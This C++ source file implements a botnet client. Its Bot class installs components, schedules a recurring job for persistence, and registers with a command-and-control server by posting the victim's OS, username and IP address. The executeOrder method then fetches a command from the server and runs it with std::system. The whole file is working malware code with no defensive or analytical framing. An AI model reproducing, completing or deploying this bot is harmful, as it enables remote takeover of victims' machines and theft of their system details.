#ifdef WIN32
    #include "win-components.hh"
    #include "win-request.hh"
#endif

#ifdef __linux__
    #include "linux-components.hh"
    #include "linux-request.hh"
#endif

#include <string>
#include <fstream>
#include <random>
#include <cstdlib>
#include "constants.hh"
#include "picosha2.h"

class C2Server {
public:
    C2Server(const std::string& registerUrl, const std::string& cmdUrl) {
        _registerUrl = registerUrl;
        _cmdUrl = cmdUrl;
    }

    std::string getRegisterUrl() { return _registerUrl; }
    std::string getCmdUrl() { return _cmdUrl; }

private:
    std::string _registerUrl, _cmdUrl;
};

class Seed {
public:
    Seed (const std::string& filePath) { _path = filePath; }
    bool exists();
    void initSeed();
    void getSeed();
    std::string getHash() { return _hash; }

private:
    std::string _path, _hash;

    void calcHash(const std::string&);
    void calcHash(std::ifstream&);
};

bool Seed::exists() {
    std::ifstream inFile(_path);
    return (inFile.good());
}

std::string genSeedData(int rngNumIter) {
    // Use <random> header for portability
    std::string seedData;
    std::random_device randomDev;
    std::mt19937 randNum(randomDev());
    for (int i=0; i < rngNumIter; ++i) {
        seedData.push_back((char)randNum());
    }

    return seedData;
}

void Seed::initSeed() {
    std::string seedData;
    std::ofstream seedFile (_path, std::ios::binary|std::ios::trunc);
    if ( seedFile.is_open() ) {
        seedData = genSeedData(SEED_RNG_ITERATIONS);
        seedFile << seedData;
    }

    calcHash(seedData);
}

void Seed::getSeed() {
    if ( exists() ) {
        std::ifstream seedFile (_path, std::ios::binary);
        if ( seedFile.is_open() ) {
            calcHash(seedFile);
        }
    }
}

void Seed::calcHash (const std::string& str) {
    _hash = picosha2::hash256_hex_string(str);
}

void Seed::calcHash (std::ifstream& seedFile) {
    // This method may use less memory than getting hex_str from string
    std::vector<unsigned char> hash(32);
    picosha2::hash256(
            std::istreambuf_iterator<char>(seedFile),
            std::istreambuf_iterator<char>(),
            hash.begin(),
            hash.end()
            );
    std::string hex_str = picosha2::bytes_to_hex_string(hash.begin(), hash.end());
    _hash = hex_str;
}

class Bot {
public:
    Bot(const std::string& seedPath, C2Server* server) {
        _hashType = HASH_TYPE;
        _seed = new Seed(seedPath);
        _c2Server = server;
    }
    ~Bot() { delete _seed; }
    void executeOrder();

    void init();
    bool isInit();

private:
    std::string _hashType, _hashSum, _os, _user, _ipAddr;
    Seed* _seed;
    C2Server* _c2Server;

    void _prepareSysInfo();
    void _registerBot();
};

void Bot::init() {
    // Install files and components
    install::installFiles();
    _seed->initSeed();
    _registerBot();
    install::initRecurringJob();
}

bool Bot::isInit() {
    return _seed->exists();
}

void Bot::executeOrder() {
    // Retrieve commands to run and execute
    _prepareSysInfo();
    std::string postForm =
        "hash_sum=" + _hashSum
        + "&ip_addr=" + _ipAddr;
    std::string cmd = request::post(_c2Server->getCmdUrl(), postForm);
    std::system(cmd.c_str());
}

void Bot::_prepareSysInfo() {
    // Init or retrieve seed
    if (_seed->exists()) {
        _seed->getSeed();
    } else {
        _seed->initSeed();
    }

    // Retrieve values if they haven't been already
    if (!(_hashSum.size())) {
        _hashSum = _seed->getHash();
    }
    if(!(_os.size())) {
        _os = util::getOS();
    }
    if(!(_user.size())) {
        _user = util::getUser();
    }
    if(!(_ipAddr.size())) {
        _ipAddr = util::getIPAddr();
    }
}

void Bot::_registerBot() {
    // Register bot with C2 server
    _prepareSysInfo();
    std::string postForm =
        "hash_type=" + _hashType
        + "&hash_sum=" + _hashSum
        + "&operating_sys=" + _os
        + "&user=" + _user
        + "&ip_addr=" + _ipAddr;
    request::post(_c2Server->getRegisterUrl(), postForm);
}
